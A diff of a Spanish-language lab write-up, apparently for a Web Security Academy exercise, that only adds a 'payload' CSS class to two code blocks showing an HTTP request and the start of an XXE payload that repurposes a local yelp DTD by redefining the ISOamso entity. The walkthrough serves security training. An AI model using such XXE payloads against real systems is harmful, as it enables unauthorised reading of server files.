@@ -25,7 +25,7 @@ tags:
 > 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (target/collab/exploit) + el **objetivo** del ataque (archivo/URL/entidad).
 
 Confirmás que existe un DTD conocido cargándolo solo. El estándar es el de GNOME **`yelp`**:
-<pre><code>POST /product/stock HTTP/1.1
+<pre class="payload"><code>POST /product/stock HTTP/1.1
 Host: <mark>TARGET.web-security-academy.net</mark>
 Content-Type: application/xml
 
@@ -42,7 +42,7 @@ Si **no** da error de "archivo no encontrado" → existe → seguí.
 
 ### 2. El ataque — redefinir una entidad del DTD local
 En `docbookx.dtd` existe la entidad de parámetro `ISOamso`. La **redefinís**:
-<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+<pre class="payload"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;!DOCTYPE foo [
 &lt;!ENTITY % local_dtd SYSTEM "<mark>file:///usr/share/yelp/dtd/docbookx.dtd</mark>"&gt;
 &lt;!ENTITY % <mark>ISOamso</mark> '
